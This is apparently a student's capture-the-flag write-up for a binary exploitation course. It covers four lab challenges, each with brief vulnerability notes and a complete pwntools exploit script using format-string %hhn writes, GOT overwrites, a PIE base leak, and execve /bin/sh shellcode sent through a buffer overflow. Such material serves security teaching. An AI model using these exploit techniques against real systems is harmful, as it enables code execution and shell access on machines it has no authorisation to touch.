meme
============================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMy1tZW1lIiwiaXAiOiIxNDQuMTM2LjI4LjM2Iiwic2Vzc2lvbiI6IjIyZDk2MjEyLTg4N2MtNDRiYy04YzAzLTNkMGQwZjJjNjViOCJ9.AXlhshokxbNVY0lsx-0ZOu2CBKMd7qQvn428x15PSqw}
General overview of problems faced
-----------------------------------------------
Stack pointer given. Needed to interpret what the stack pointer was for.
Used %2$s to find out that 6447 was containing in this pointer.
Using binary ninja, I saw that this pointer was used to compare
to another string "MEME" so this means I had to write this into the pointer using %n.
Probably didn't need the null terminator since it was probably
already there and we had the same number of characters for each string.
-----------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './meme' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29835 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# We are given apointer, possible a stack pointer.
# We need to write "MEME" intro 0x804a17c
# With input = BAAAA %x %x %x, we get 42000000 41414141 ...
# The stack pointer pointers to (originally) "6447" so this
# is what we need to overwrite
# last brute force attempt 64
p.recvuntil(b'the way at ', drop = True)
stack_ptr = p.recvuntil(b'\n', drop = True)
log.info(f"stack pointer: {stack_ptr}")
stack_ptr = int(stack_ptr, 16)
log.info(f"stack pointer: {stack_ptr}")
p.recvuntil(b'open: ', drop = True)
#padding
payload = b'A'
#Target address (where 6447 is stored)
payload += p32(stack_ptr)
# %s to access the address
payload += b'%2$s'
# Payload successfully leaks 6447, now we want to replace this
# with MEME, M = 4D, E = 45

#p.sendline(payload)
#padding
exploit = b'A'

exploit += p32(stack_ptr)     #M
exploit += p32(stack_ptr + 1) #E
exploit += p32(stack_ptr + 2) #M
exploit += p32(stack_ptr + 3) #E
#exploit += p32(stack_ptr + 4) #\n

# Write first %n (so far, 21 bytes, or use len)
curr_bytes = len(exploit)
# Fill in remaining to get 4D
write_M = ord('M') - curr_bytes
exploit += f'%{write_M}x%2$hhn'.encode()

# Reset bytes (kinda, reset last two bytes to 00)
write_E = 0x100 + ord('E') - ord('M')
exploit += f'%{write_E}x%3$hhn'.encode()

write_M = 0x100 + ord('M') - ord('E')
exploit += f'%{write_M}x%4$hhn'.encode()

write_E = 0x100 + ord('E') - ord('M')
exploit += f'%{write_E}x%5$hhn'.encode()

#write_null = 0x100 + 0x00 - ord('E')
#exploit += f'%{write_null}x%6$hhn'.encode()

p.sendline(exploit)
p.sendline("cat flag")
flag = p.recvline()
log.info(f"Flag retrieved: {flag}")
p.interactive()
```

tetris
==============================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMy10ZXRyaXMiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiMjg3NDMyNDktNTkwNi00ZWJhLTk2NjktMDRkZTBlMmY0ZWQ1In0.Wsywe6PLILrUQ6ji_24epzASzRo-OiUlgMrRCx5c9pw}
General overview of problems faced
--------------------------------------------------
Options given.
Option 1: calls fgets, no format strings vuln from initial inspection.
Option 2: Prints out highscores to stdout. Bunch of puts calls, maybe can be used to leak.
Option 3: puts and printf called here. Possible leak source.
Password checks for len == 0x54.
Option 4: Chess game? No idea what use this will be in my endeavours
May be able to call eax at 0x804901d
Inserted 0x53 characteres as password input (sent a's) and we get a stack pointer. This pointer points to our buffer that was used to store our input (examine using pwngdb)
We can store shellcode into this address' buffer. We just need to
find a way to call this address.
The get_name function fgets more bytes than the buffer size, so this is buffer is overflowable.
The read_option function takes in this buffer.
No win function, probably means I gotta execve with some shellcode.
Need to create a payload with shellcode with overall 0x53 bytes.
Additionally, they must not contain null bytes or else it will end the payload prematurely.
Need to fill remaining bytes with something, and we have to detect how many bytes the shellcode takes to know how many filler bytes to use.
Stack address gets read in as b'...', so I gotta convert that to a string format and get rid of the b's and the ' and the null terminator at the end.
Need to know how many bytes to fill the payload before we hit the return address, and account for alignment.

--------------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './tetris' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 10922 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
printflag_asm = """
xor ecx, ecx
mul ecx
xor ebx, ebx

mov al, 0xb
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
"""
# Want 0x53 bytes (83)
filler = b'a'
payload = asm(printflag_asm)
#print(payload.index(b"\x00"))
n_filler = 0x54 - len(payload) - 1
payload += filler * n_filler
#print(payload.index(b"\x00"))
print(payload)

p.recvuntil(b'Quit', drop=True)
p.recvline()
p.sendline(b'3')

p.recvuntil(b'password:', drop=True)
p.sendline(payload)

p.recvuntil(b'offset ', drop=True)
stack_pointer = p.recvline()
stack_pointer = str(stack_pointer[:10])
log.info(stack_pointer)
stack_pointer = stack_pointer[2:12]

log.info(stack_pointer)
stack_pointer = int(stack_pointer, 0)
log.info(f"Stack pointer: {stack_pointer}")
#Stack pointer acquired

p.recvuntil(b'> ', drop=True)
p.sendline(b'1')
#len_stack_pointer = len(stack_pointer)
#log.info(str(len_stack_pointer))

padding = 42
p.sendline(b'a'*padding + p32(stack_pointer))
p.interactive()
```

formatrix
=================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMy1mb3JtYXRyaXgiLCJpcCI6IjE0NC4xMzYuMjguMzYiLCJzZXNzaW9uIjoiODI4NGEzZDEtNThjYi00ZDllLThhYjQtM2E4OWUzNGRhM2ViIn0.Q3pzEGBz_k7zWyfGl0dwi5Mfu1gfQDC_sf27gV9xGfo}
General overview of problems faced
------------------------------------------------
Win function at 0x8048536
printf function at 0x80483b0
Locate our buffer on the stack: 3rd argument so use %3$x.
Load printf address onto the stack via buffer, then use %n to replace it with the win function address.
No padding needed
Important note:
The function address of printf IS NOT the address needed to overwrite the global offset table. To get this,
I needed to use pwngdb.
1. Disassemble main (or the relevant function)
2. examine (command: x) the printf function address
3. examine the jmp address
4. It should lead to the global offset table, so that is
the address you want.
Now, we can construct our payload similar to meme.
Binary ninja notes:
The global offset table is found near the bottom. Binary ninja has functons near the top of the symbol list and the bottom. Using addresses found in functions leads to the top of the list. This is NOT where the global offset table is. You are looking for the bottom of the list function symbols. It literally says "_GLOBAL_OFFSET_TABLE_.
Hint: Ctrl+f, Find type: text (disassembly), _GLOBAL_OFFSET_TABLE_
---------------------------------------------------
```
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './formatrix' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 13742 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p.recvuntil(b'You say: ', drop=True)

# Win function at    0x08048536
# printf function at 0x080483b0
#                    0x8049c18
# sprintf            0x08048400
# fgets              0x080483c0
target = 0x8049c18
payload = p32(target)
payload += p32(target + 1)
payload += p32(target + 2)
payload += p32(target + 3)

write_36 = 0x36 - len(payload)
payload += f'%{write_36}x%3$hhn'.encode()

write_85 = 0x100 + 0x85 - 0x36
payload += f'%{write_85}x%4$hhn'.encode()

write_04 = 0x100 + 0x04 - 0x85
payload += f'%{write_04}x%5$hhn'.encode()

write_08 = 0x100 + 0x08 - 0x04
payload += f'%{write_08}x%6$hhn'.encode()

p.sendline(payload)

p.interactive()
```

elonmusk
==================================================
FLag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMy1lbG9ubXVzayIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiIxZDUyZWFmYS1lNWM1LTRiOWMtODhjOS0zOWIxZGVmODUzZTkifQ.7JjQKTSDoV69DzDvbW3ojG8YuTg2Ca2GgWueeJUbk7M}
General overview of problems faced
-------------------------------------------------
Upon startup, you are asked a name (input)
Input terminates early if you use space
After that, options:
(t)travel -> travel to various marketplaces
(g)amble -> gamble some coin - Fibonacci question? wow...
May need a fibonacci checker or just keep gambling until lucky
(b)uy -> buy crypto
(s)ell -> sell crypto
(q)uit -> quit 
Binary is more massive than usual.
There's a win function
Need to find vulnerable printf format strings: One found when you win a gamble.
Need overwrite a function in the GOT table.
Input buffer is at argument position 5.
Most of my notes are written as comments on the function since I got lazy in switching between files to write.
Main problems were finding offsets. Function and global offset table offsets could be found using binary ninja.
To find offset during function runtime, I had to run pwngdb and break before the vulnerable prinf to see what was on the stack. do_gamble+295.
Breaking was more troublesome since the addresses were kinda randomised, so i had to let the program run to initialise the addresses to breakpoint properly.
Since you can't simply hardcode addresses anymore, I had to find out a way to do the padding to use %n.
*** Wow this took some time ***
---------------------------------------------------
```
from pwn import *
import math

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './elonmusk' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 6832 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Fibonacci checker
def isPerfectSquare(x):
    ret = int(math.sqrt(x))
    return ret*ret == x

def isFibonacci(x):
    x = int(x)
    return isPerfectSquare(5*x*x+4) or isPerfectSquare(5*x*x-4)

def auto_gamble(x):
    p.recvuntil(b': ', drop=True)
    p.sendline("1")
    p.recvuntil(b'1) ', drop=True)
    one = p.recvline()
    #log.info(one)
    p.recvuntil(b'2) ', drop=True)
    two = p.recvline()
    #log.info(two)
    p.recvuntil(b'3) ', drop=True)
    three = p.recvline()
    #log.info(three)
    p.recvuntil(b'4) ', drop=True)
    four = p.recvline()
    #log.info(four)
    p.recvuntil(b'5) ', drop=True)
    five = p.recvline() 
    #log.info(five)
    p.recvuntil(b'> ', drop=True)
    if not isFibonacci(one):
        p.sendline("1")
        #log.info("1")
    elif not isFibonacci(two):
        p.sendline("2")
        #log.info("2")
    elif not isFibonacci(three):
        p.sendline("3")
        #log.info("3")
    elif not isFibonacci(four):
        p.sendline("4")
        #log.info("4")
    else:
        p.sendline("5")
        #log.info("5")
    p.recvuntil(b', ', drop=True)
    if x == 1:
        leak = p.recvuntil('!',drop=True)
        p.recvuntil(b'continue...', drop=True)
        p.sendline("a")
        return leak
    else:
        
        return

p.recvuntil(b'> ', drop=True)
payload = b'%3$p'
p.sendline(payload)

p.recvuntil(b'What will you do? ', drop=True)
p.sendline("g")

leak = auto_gamble(1)
log.info(leak)

# Checkpoint above functions leak printf vulnerability successfully
# Inspect stack right before vulnerable printf is called
#========================================================
# 00:0000│ esp 0xffffcd70 —▸ 0xffffcd84 ◂— '%3$p'
# 01:0004│     0xffffcd74 —▸ 0x56559ed4 (g_player+20) ◂— '%3$p'
# 02:0008│     0xffffcd78 ◂— 0x100
# 03:000c│     0xffffcd7c —▸ 0x56556ffc (do_gamble+295) ◂— sub    eax, 1
# 04:0010│     0xffffcd80 —▸ 0xf7fdf2c9 (check_match+9) ◂— add    edi, 0x1dd37
# 05:0014│ eax 0xffffcd84 ◂— '%3$p'
# 06:0018│     0xffffcd88 ◂— 0x0
#=======================================================
# %1 is where g_player+20 is which stores our name
# %2 shows 0x100
# %3 shows the do_gamble functon address. We can use this to get our
# offset for base
# do_gamble offset is 0x1ed5
base = int(leak, 16) - 295 - 0x1ed5
log.info(hex(base))
p.recvuntil(b'do? ', drop=True)
# For some reason, we need to press twice
p.sendline()
p.sendline("c")
p.recvline()
# From GOT table, lets overwrite printf, offset = 0x4cd0
win = base + 0x1537

target = base + 0x4cd0
log.info(hex(target))
payload = p32(target)
payload += p32(target + 1)
payload += p32(target + 2)
payload += p32(target + 3)

win = str(hex(win))

first_byte = win[8:]
log.info(first_byte)
first_byte = int(first_byte, 16)

second_byte = win[6:8]
log.info(second_byte)
second_byte = int(second_byte, 16)

third_byte = win[4:6]
log.info(third_byte)
third_byte = int(third_byte, 16)

fourth_byte = win[2:4]
log.info(fourth_byte)
fourth_byte = int(fourth_byte, 16)

fourth_byte = fourth_byte + 0x100 - third_byte
third_byte = third_byte + 0x100 - second_byte
second_byte = second_byte + 0x100 - first_byte
first_byte = first_byte + 0x100 - len(payload)

log.info(str(first_byte))
log.info(str(second_byte))
log.info(str(third_byte))
log.info(str(fourth_byte))
# We can't hardcode address since they change.

#first_byte = u8(p32(win)[0]) + 0x100 - len(payload)

payload += f"%{first_byte}x%5$hhn".encode()

#second_byte = u8(p32(win)[1]) + 0x100 - u8(p32(win)[0])
payload += f"%{second_byte}x%6$hhn".encode()

#third_byte = u8(p32(win)[2]) + 0x100 - u8(p32(win)[1])
payload += f"%{third_byte}x%7$hhn".encode()

#fourth_byte = u8(p32(win)[3]) + 0x100 - u8(p32(win)[2])
payload += f"%{fourth_byte}x%8$hhn".encode()

p.sendline(payload)

p.recvuntil(b'do? ', drop=True)
p.sendline("g")
auto_gamble(0)


p.interactive()
```